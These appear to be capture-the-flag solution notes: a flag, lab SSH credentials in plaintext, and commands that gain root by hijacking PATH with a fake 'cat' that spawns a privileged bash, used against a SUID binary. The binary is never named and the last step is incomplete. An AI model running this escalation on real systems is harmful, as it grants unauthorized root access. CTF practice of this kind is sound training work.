Flag: obsidian{su1d_p4th_h1j4ck_r00t}

ssh credentials:
sysadmin_01
Sup3rS3cr3tSSH!



//locate the vuln binary
find / -perm -u=s -type f 2>/dev/null

cd /tmp

//Create the fake "cat" command
echo "/bin/bash -p" > cat

chmod +x cat

//Hijack the $PATH variable
export PATH=/tmp:$PATH

whoami

/usr/bin/cat /root/flag4.txt